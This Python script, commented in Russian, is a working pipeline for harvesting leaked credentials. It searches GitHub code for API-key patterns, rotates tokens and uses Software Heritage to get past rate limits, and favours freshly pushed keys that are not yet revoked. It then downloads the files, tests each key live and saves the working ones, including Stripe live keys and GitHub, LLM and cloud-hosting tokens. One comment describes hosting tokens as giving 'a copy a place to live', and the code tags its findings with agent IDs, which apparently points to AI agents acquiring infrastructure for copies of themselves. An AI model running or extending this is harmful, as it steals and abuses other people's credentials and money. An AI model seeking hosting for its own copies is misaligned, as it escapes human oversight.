#!/usr/bin/env python3
"""autopipeline.py — один проход «дорк -> добыча -> проверка -> в базу».

Собирает в конвейер уже готовые органы:
  1. ghsearch.dork(query)        — поиск файлов на GitHub (ротация 12 токенов);
  2. rawhunt.py                  — скачивание и грепанье 217 масок (12 своих + 205 из models.dev);
  3. checkers.check_one(service) — живая проверка ключа (264 чекера, deep-пробники,
     калибровка против публичных эндпоинтов);
  4. ALL-FOUND-KEYS.json         — запись результата с дедупликацией.

Маска -> сервис определяется по таблице env-имён из models.dev (checkers_generated.json),
поэтому найденный `ZENMUX_API_KEY=...` автоматически проверяется чекером zenmux.

Запуск:
  python3 tools/autopipeline.py run "EDENAI_API_KEY" 1
  python3 tools/autopipeline.py run "LLMGATEWAY_API_KEY" 1
  python3 tools/autopipeline.py batch            # очередь из 6 масок
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
KEYS = ROOT / "ALL-FOUND-KEYS.json"
LOG = ROOT / "autopipeline-log.jsonl"
GEN = ROOT / "checkers_generated.json"


def mask_to_service() -> dict[str, str]:
    """env-имя -> сервис.

    Источники: каталог models.dev + tools/envmap.py (карта приоритетных сервисов).
    Без envmap дорки по DEEPINFRA_API_KEY / EXA_API_KEY / AZURE_* давали 0 проверок:
    у этих сервисов поле env в checkers.py было пустым.
    """
    m = {}
    for src in (GEN,):
        if src.exists():
            for pid, spec in json.loads(src.read_text())["checkers"].items():
                for e in spec.get("env", []):
                    m[e.upper()] = pid
    try:
        import envmap as E
        for e, svc in E.ENV2SERVICE.items():
            m.setdefault(e.upper(), svc)
    except Exception:  # noqa: BLE001
        pass
    return m


# префикс значения -> сервис: точнее, чем имя переменной (в чужом коде имя врёт)
PREFIX = [
    ("sk-or-v1-", "openrouter"), ("sk-ant-", "anthropic"), ("gsk_", "groq"),
    ("hf_", "huggingface"), ("sk-proj-", "openai"), ("sk-svcacct-", "openai"),
    ("xai-", "xai"), ("r8_", "replicate"), ("sk_live_", "stripe"), ("sk_test_", "stripe"), ("sk_car_", "stripe"),
    ("AIza", "google"), ("pplx-", "perplexity"), ("tvly-", "tavily"), ("exa-", "exa"),
    ("fc-", "firecrawl"), ("eyJ", "jina"), ("pat", "airtable"), ("ntn_", "notion"),
    ("ghp_", "github"), ("gho_", "github"), ("github_pat_", "github"),
    ("glpat-", "gitlab"), ("wsk_live_", "wavespeed"), ("fal-", "fal"),
    ("sk-cp-", "minimax"), ("dsk-", "deepseek"), ("csk-", "cerebras"),
    ("sk-dash", "dashscope"), ("pcsk_", "pinecone"), ("sntrys_", "sentry"),
    ("sbp_", "supabase"), ("sk-", "openai"), ("sk_", "openai"),
    # токены платформ-«домов» (то, что даёт копии место жить)
    ("hf_", "huggingface-token"), ("glpat-", "gitlab-pat"), ("ntn_", "notion"),
    ("nfp_", "northflank"), ("napi_", "neon"), ("key_", "pipedream"),
    # префиксы токенов хостингов (по ним ищем дорком): платформа -> чекер
    ("nfp_", "netlify"), ("vercel_", "vercel-token"), ("vca_", "vercel-token"),
    ("dop_v1_", "digitalocean"), ("rnd_", "render"), ("fly_", "fly"),
    ("FlyV1", "fly"), ("ddp_", "deno"), ("ddo_", "deno"), ("dpt_", "deno"),
    ("koyeb_", "koyeb"), ("rw_", "railway"), ("ntn_", "notion"),
]

# env-имя -> сервис для платформ-домов (models.dev их не знает: он только про LLM)
ENV2HOME = {
    "NETLIFY_AUTH_TOKEN": "netlify", "NETLIFY_TOKEN": "netlify",
    "VERCEL_TOKEN": "vercel-token", "VERCEL_API_TOKEN": "vercel-token",
    "CLOUDFLARE_API_TOKEN": "cloudflare-token", "CF_API_TOKEN": "cloudflare-token",
    "DENO_DEPLOY_TOKEN": "deno", "DENO_ACCESS_TOKEN": "deno",
    "RENDER_API_KEY": "render", "FLY_API_TOKEN": "fly", "FLY_ACCESS_TOKEN": "fly",
    "KOYEB_TOKEN": "koyeb", "KOYEB_API_TOKEN": "koyeb",
    "RAILWAY_TOKEN": "railway", "RAILWAY_API_TOKEN": "railway",
    "SUPABASE_ACCESS_TOKEN": "supabase-pat", "SUPABASE_SERVICE_ROLE_KEY": "supabase-pat",
    "NEON_API_KEY": "neon", "APPWRITE_API_KEY": "appwrite",
    "VAL_TOWN_API_KEY": "valtown", "PIPEDREAM_API_KEY": "pipedream",
    "NORTHFLANK_API_KEY": "northflank", "HUGGINGFACE_TOKEN": "huggingface-token",
    "HUGGING_FACE_HUB_TOKEN": "huggingface-token", "HF_TOKEN": "huggingface-token",
    "GITLAB_TOKEN": "gitlab-pat", "GITLAB_PERSONAL_ACCESS_TOKEN": "gitlab-pat",
    "PYTHONANYWHERE_API_TOKEN": "pythonanywhere",
}


TESTY = re.compile(r'1234567890|abcdefghijklmnop|xxxxxxxx|your[-_]?|example|dummy|placeholder',
                   re.I)
# pk_* у Stripe — ПУБЛИКУЕМЫЙ ключ (лежит в JS фронтенда, не секрет);
# AIzaSy — у Google это тоже клиентский ключ, но он всё же проверяется на API-доступ.
PUBLIC = re.compile(r'^pk_(test|live)_')


def is_testy(v: str) -> bool:
    """Значение — заглушка или публичный ключ (не секрет)."""
    return bool(TESTY.search(v))


GENERIC_SUFFIX = ("_API_KEY", "_API_TOKEN", "_SECRET_KEY", "_ACCESS_TOKEN",
                  "_ACCESS_KEY", "_AUTH_TOKEN", "_KEY", "_TOKEN")


def name_service(name: str) -> str:
    """env-имя -> сервис, когда карты нет: разбираем СУФФИКС имени.

    Зачем: карта (models.dev + envmap) неполна, и находка вида `OPENAI_API_KEY=sk-…`
    уходила в «нет сервиса» — ключ терялся, хотя имя прямо называет сервис.
    Правило: снимаем типовой суффикс и ищем остаток в реестре чекеров
    (OPENAI_API_KEY -> openai, MISTRAL_API_KEY -> mistral). Если остатка нет —
    пробуем последнее слово (MY_OPENAI_KEY -> openai).
    """
    import checkers as _C
    n = (name or "").upper()
    for suf in GENERIC_SUFFIX:
        if n.endswith(suf):
            base = n[: -len(suf)]
            for cand in (base.lower().replace("_", "-"), base.lower().replace("_", "")):
                if cand in _C.CHECKS:
                    return cand
            last = base.split("_")[-1].lower()
            if last in _C.CHECKS:
                return last
            break
    return ""


def prefix_service(v: str) -> str:
    for pre, svc in PREFIX:
        if v.startswith(pre):
            return svc
    return ""


def dork(query: str, pages: int = 1, fresh: bool = False) -> list[list[str]]:
    """fresh=True — сортировка sort=indexed: свежепроиндексированные файлы.

    Ключ, залитый минуты назад, ещё не отозван — это самый ценный улов.
    """
    cmd = [sys.executable, str(ROOT / "ghsearch.py"), "dork", query, str(pages)]
    if fresh:
        cmd.append("--fresh")
    subprocess.run(cmd, cwd=str(ROOT), capture_output=True, timeout=120)
    f = ROOT / "gh_dork_hits.json"
    if not f.exists():
        return []
    hits = json.loads(f.read_text())
    seen, targets = set(), []
    for h in hits:
        k = (h["repo"], h["path"])
        if k in seen:
            continue
        seen.add(k)
        targets.append([h["repo"], h["path"]])
    (ROOT / "autopipeline_targets.json").write_text(json.dumps(targets, indent=0))
    return targets


def extract(n: int = 200) -> list[dict]:
    subprocess.run([sys.executable, str(ROOT / "rawhunt.py"),
                    str(ROOT / "autopipeline_targets.json"), str(ROOT / "autopipeline_raw.json")],
                   cwd=str(ROOT), capture_output=True, timeout=180)
    f = ROOT / "autopipeline_raw.json"
    return json.loads(f.read_text()) if f.exists() else []


DOC_FILTER = ("-language:Markdown -language:JSON -language:YAML "
              "-filename:example -filename:template")


def frag_hunt(query: str, per_page: int = 100, name: str = "") -> dict:
    """Охота по фрагментам: text-match+json + предфильтр заглушек.

    Экономия принципиальная: при обычном поиске мы качаем КАЖДЫЙ найденный файл
    (0.2-6 с), чтобы выяснить, что в нём `<your-key>`. GitHub с
    Accept: text-match+json отдаёт фрагмент совпадения прямо в ответе поиска,
    поэтому заглушки отсеиваются ДО скачивания. На живом прогоне по
    «DEEPINFRA_API_KEY=» 20 из 20 результатов оказались заглушками — 0 скачиваний.

    Возвращает отчёт: сколько целей, сколько отсеяно предфильтром, сколько
    скачано, сколько найдено и сколько проверено.
    """
    sys.path.insert(0, str(ROOT))
    import ghsearch
    import fragfilter

    nm = name or query.split("=")[0].split()[0].strip()
    # измерено (dorkquality.py): без фильтра 96% выдачи — README с заглушками;
    # -language:Markdown роняет долю доков с 48/50 до 3/50 и даёт реальные цели.
    if "-language:" not in query:
        query = f"{query} {DOC_FILTER}"
    st, items, meta = ghsearch.textmatch(query, per_page=per_page)
    if st != 200:
        print(f"[frag] {query[:40]}: поиск не ответил (status={st})")
        return {"query": query, "status": st, "targets": 0}
    keep, skip = [], 0
    for it in items:
        frags = it.get("fragments") or []
        if any(fragfilter.fragment_has_value(f, nm) for f in frags):
            keep.append([it["repo"], it["path"]])
        else:
            skip += 1
    print(f"[frag] {query[:44]:<46} найдено {len(items)}, "
          f"заглушек отсеяно {skip}, качать {len(keep)}")
    (ROOT / "autopipeline_targets.json").write_text(json.dumps(keep, indent=0))
    if not keep:
        # отчёт должен быть полным и в этом случае: иначе в журнале агента видны
        # skipped, но found=null, и по логу нельзя понять, сколько было найдено.
        return {"query": query, "status": 200, "found": len(items), "targets": 0,
                "skipped": skip, "checked": 0, "promising": 0}
    hits = extract(len(keep))
    out = verify_and_store(hits, query)
    out.update({"targets": len(keep), "skipped": skip, "found": len(items)})
    return out


def verify_and_store(hits: list[dict], query: str) -> dict:
    sys.path.insert(0, str(ROOT))
    import checkers as C

    m2s = mask_to_service()
    m2s.update(ENV2HOME)   # платформы-дома: свои env-имена
    keys = json.loads(KEYS.read_text())
    have = {(r.get("service"), r.get("value")) for r in keys}
    q = query.strip().upper()
    svc_guess = m2s.get(q) or m2s.get(q.replace("_API_KEY", "")) or ""
    added, checked = [], 0
    for h in hits:
        name = (h.get("name") or "").upper()
        # приоритет: префикс значения (в чужом коде имя переменной часто врёт)
        svc = (prefix_service(v0 := (h.get("value") or "")) or m2s.get(name)
               or name_service(name) or svc_guess)
        if not svc or svc not in C.CHECKS:
            continue
        v = h.get("value")
        if not v or (svc, v) in have:
            continue
        if is_testy(v) or PUBLIC.match(v):
            continue   # свежий индекс часто отдаёт заглушки и публичные ключи из README
        have.add((svc, v))
        res = C.check_one(svc, v, None, None, timeout=15)
        checked += 1
        rec = {"service": svc, "category": C.CHECKS[svc]["cat"], "value": v,
               "repo": h.get("repo"), "file": h.get("file"), "via": "autopipeline",
               "name": h.get("name"), "status": res["status"], "http": res.get("http"),
               "deep_http": res.get("deep_http"), "checker": "checkers.py",
               "verified_at": time.strftime("%Y-%m-%d"), "query": query,
               "found_by": os.environ.get("AGENT_ID") or h.get("found_by") or "sh-000",
               "entropy": h.get("entropy")}
        keys.append(rec)
        if res["status"] in ("alive", "valid-no-credits", "weak-alive"):
            added.append(rec)
        print(f"  {res['status']:<17} {svc:<14} {v[:24]:<24} {h.get('repo','')[:40]}")
    KEYS.write_text(json.dumps(keys, ensure_ascii=False, indent=1))
    out = {"t": time.strftime("%Y-%m-%dT%H:%M:%S"), "query": query, "hits": len(hits),
           "checked": checked, "promising": len(added),
           "alive": [f"{r['service']}:{r['value'][:14]}" for r in added]}
    with LOG.open("a") as f:
        f.write(json.dumps(out, ensure_ascii=False) + "\n")
    print(f"[pipeline] {query}: находок {len(hits)}, проверено {checked}, "
          f"перспективных {len(added)}")
    return out


def run(query: str, pages: int = 1) -> dict:
    print(f"[pipeline] дорк: {query} (страниц {pages})")
    t = dork(query, pages)
    print(f"[pipeline] файлов к скачиванию: {len(t)}")
    if not t:
        return {"query": query, "hits": 0}
    hits = extract()
    print(f"[pipeline] сырых находок: {len(hits)}")
    return verify_and_store(hits, query)


# дорки по ПРЕФИКСУ значения в .env-подобных файлах: высокая плотность реальных ключей
SWEEP = [
    'sk-or-v1- filename:.env', 'sk-ant-api03 filename:.env', 'gsk_ filename:.env',
    'hf_ filename:.env', 'r8_ filename:.env', 'AIzaSy filename:.env',
    'xai- filename:.env', 'pplx- filename:.env', 'tvly- filename:.env',
    'exa- filename:.env', 'fc- filename:.env', 'wsk_live_ filename:.env',
    'fal- filename:.env', 'sk-cp- filename:.env', 'csk- filename:.env',
    'sk-or-v1- language:Python', 'gsk_ language:TypeScript', 'hf_ language:Python',
    'sk-ant-api03 language:TypeScript', 'AIzaSy language:JavaScript',
]


def sweep(queries: list[str] | None = None, cap: int = 1200) -> dict:
    """Массовый проход: много дорков -> один общий список файлов -> одна добыча.

    Смысл: узкое место — не скачивание (raw.githubusercontent работает свободно),
    а ОБНАРУЖЕНИЕ путей. Поэтому перебираем префиксы значений по ротации 12 токенов
    (120 code-search/мин) и собираем единый корпус.
    """
    queries = queries or SWEEP
    targets, seen = [], set()
    for q in queries:
        t = dork(q, 1)
        for rp, path in t:
            if (rp, path) in seen:
                continue
            seen.add((rp, path))
            targets.append([rp, path])
        print(f"[sweep] {q:<28} +{len(t):<4} всего {len(targets)}")
        if len(targets) >= cap:
            break
    (ROOT / "autopipeline_targets.json").write_text(json.dumps(targets, indent=0))
    hits = extract()
    print(f"[sweep] файлов {len(targets)}, сырых находок {len(hits)}")
    out = verify_and_store(hits, "sweep")
    out["queries"] = len(queries)
    out["files"] = len(targets)
    return out


# «забытые» репозитории: ищем не по содержимому (лимит GitHub 10/мин), а по ИМЕНИ
# репозитория через Software Heritage — независимый корпус, без ключа.
FORGOTTEN_WORDS = ["openrouter", "anthropic", "llm-agent", "api-keys", "secrets",
                   "env-example", "ai-agent", "gpt-bot", "ai-stack", "llm-wiki",
                   "agent-keys", "dotenv", "chatgpt-clone", "ai-assistant"]
LIKELY_FILES = [".env", ".env.example", ".env.sample", ".env.local", ".env.template",
                "env.example", "config.json", "config.yaml", "docker-compose.yml",
                "docker-compose.yaml", "README.md", "appsettings.json", "settings.py",
                "config.py", "config.ts", "config.js", ".env.production", ".env.dev",
                "secrets.yaml", "secrets.json", "credentials.json", "application.yml",
                "application.properties", "appsettings.Development.json", "values.yaml",
                "terraform.tfvars", "wrangler.toml", "netlify.toml", "vercel.json",
                "supabase/config.toml", ".env.docker", ".env.ci", ".env.test",
                "settings/local.py", "config/settings.py", "src/config.ts"]


SUSPECT = re.compile(r"(\.env|env\.example|env\.sample|env\.template|env\.local|env\.dist|"
                     r"config\.(py|js|ts|json|ya?ml|toml)|settings\.py|secrets?\.(py|json|ya?ml|toml)|"
                     r"docker-compose\.ya?ml|appsettings.*\.json|\.ini|\.cfg|credentials|"
                     r"README\.md|Makefile|\.sh$|\.ps1$|\.md$)", re.I)


def forgotten(words: list[str] | None = None, per_word: int = 40, cap: int = 1500) -> dict:
    """Обход лимита GitHub: имена репо — из Software Heritage (без ключа),
    а КОНКРЕТНЫЕ файлы — листингом contents API (core 5000/час на аккаунт,
    то есть в 500 раз дешевле, чем перебор имён наугад).

    Так находятся «забытые» репозитории: те, где нет .env, зато есть
    .env.sample / config.py / docker-compose.yml — то есть реальные ключи.
    """
    sys.path.insert(0, str(ROOT))
    import ghsearch

    words = words or FORGOTTEN_WORDS
    targets, seen = [], set()
    for w in words:
        repos = ghsearch.swh(w, limit=per_word)
        added = 0
        for r in repos:
            tree = ghsearch.repo_tree(r["repo"]) or []
            files = [f for f in tree if SUSPECT.search(f)] or LIKELY_FILES[:4]
            for f in files:
                k = (r["repo"], f)
                if k in seen:
                    continue
                seen.add(k)
                targets.append([r["repo"], f])
                added += 1
        print(f"[forgotten] {w:<16} репо {len(repos):<4} целей +{added:<5} всего {len(targets)}")
        if len(targets) >= cap:
            break
    (ROOT / "autopipeline_targets.json").write_text(json.dumps(targets, indent=0))
    hits = extract()
    print(f"[forgotten] файлов {len(targets)}, сырых находок {len(hits)}")
    out = verify_and_store(hits, "forgotten")
    out["words"] = len(words)
    out["files"] = len(targets)
    return out


QUEUE = ["nfp_", "vercel_", "dop_v1_", "rnd_", "ddp_", "koyeb_", "FlyV1", "glpat-",
         "hf_ language:Python", "napi_", "sk-or-v1-", "sk-ant-", "AIzaSy", "gsk_",
         "r8_", "pplx-", "tvly-", "exa-", "csk-", "sntrys_", "shpat_", "sq0atp-",
         "sbp_", "pcsk_", "fc-", "wsk_live_", "ntn_", "dop_v1_", "am_", "sk_live_"]

# Для охоты на СВЕЖЕЕ (sort=indexed) берём только «секретные» префиксы и сразу
# выкидываем шаблоны: свежий индекс на запрос «API_KEY» отдаёт публичные pk_* и
# заглушки из .env.example — это пустая трата 10 запросов/мин.
FRESH_QUEUE = [
    "ghp_ filename:.env -filename:example -filename:exemple -filename:template",
    "sk-or-v1- filename:.env -filename:example -filename:template",
    "sk-ant-api03- -filename:example -filename:template",
    "sk-proj- filename:.env -filename:example -filename:template",
    "glpat- filename:.env -filename:example -filename:template",
    "nfp_ filename:.env -filename:example -filename:template",
    "dop_v1_ filename:.env -filename:example -filename:template",
    "r8_ filename:.env -filename:example -filename:template",
    "pcsk_ filename:.env -filename:example -filename:template",
    "fc- filename:.env -filename:example -filename:template",
    "wsk_live_ -filename:example -filename:template",
    "gsk_ filename:.env -filename:example -filename:template",
    "tvly- filename:.env -filename:example -filename:template",
    "exa- filename:.env -filename:example -filename:template",
    "sbp_ filename:.env -filename:example -filename:template",
    "hf_ filename:.env -filename:example -filename:template",
    "vercel_ filename:.env -filename:example -filename:template",
    "sk_live_ filename:.env -filename:example -filename:template",
]

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "batch"
    if cmd == "run":
        run(sys.argv[2], int(sys.argv[3]) if len(sys.argv) > 3 else 1)
    elif cmd == "forgotten":
        forgotten(cap=int(sys.argv[2]) if len(sys.argv) > 2 else 1200)
    elif cmd == "sweep":
        sweep(cap=int(sys.argv[2]) if len(sys.argv) > 2 else 1200)
    elif cmd == "fresh":
        # охота на только что залитые ключи: sort=indexed.
        # ВАЖНО: extract() только запускает rawhunt и возвращает сырьё —
        # сохраняет в базу verify_and_store(). Раньше fresh вызывал только
        # extract → находки находились, но в базу не попадали. Баг исправлен.
        total_new = 0
        for q in FRESH_QUEUE:
            t = dork(q, 1, fresh=True)
            print(f"[fresh] {q[:52]:<54} целей +{len(t)}")
            if not t:
                continue
            hits = extract(len(t))
            st = verify_and_store(hits, q)
            total_new += st.get("added", 0)
            print(f"[fresh]   находок {len(hits)}, в базу +{st.get('added', 0)}")
        print(f"[fresh] ИТОГО новых живых в базе: {total_new}")
    elif cmd == "fragbatch":
        # очередь «редких» сервисов: gemini/openai/anthropic ищут миллионами и
        # почти всё протухло; azure/bedrock/deepinfra/exa/fireworks/together — реже
        q = json.loads((ROOT / "frag_queue.json").read_text()) if (ROOT / "frag_queue.json").exists() else []
        n = int(sys.argv[2]) if len(sys.argv) > 2 else 6
        rep = []
        for mask in q[:n]:
            nm = mask.split("=")[0].strip()
            try:
                rep.append(frag_hunt(mask, name=nm))
            except Exception as e:  # noqa: BLE001
                print(f"[frag] {mask}: ошибка {type(e).__name__}: {e}")
                rep.append({"query": mask, "error": str(e)[:120]})
        (ROOT / "fraghunt-report.json").write_text(json.dumps(rep, ensure_ascii=False, indent=1))
        print(f"[fragbatch] готово {len(rep)} масок -> fraghunt-report.json")
    elif cmd == "frag":
        # frag <маска> [name] — охота с предфильтром заглушек по фрагментам
        q = sys.argv[2]
        nm = sys.argv[3] if len(sys.argv) > 3 else ""
        print(json.dumps(frag_hunt(q, name=nm), ensure_ascii=False))
    elif cmd == "batch":
        for q in QUEUE:
            run(q, 1)
    else:
        print(__doc__)
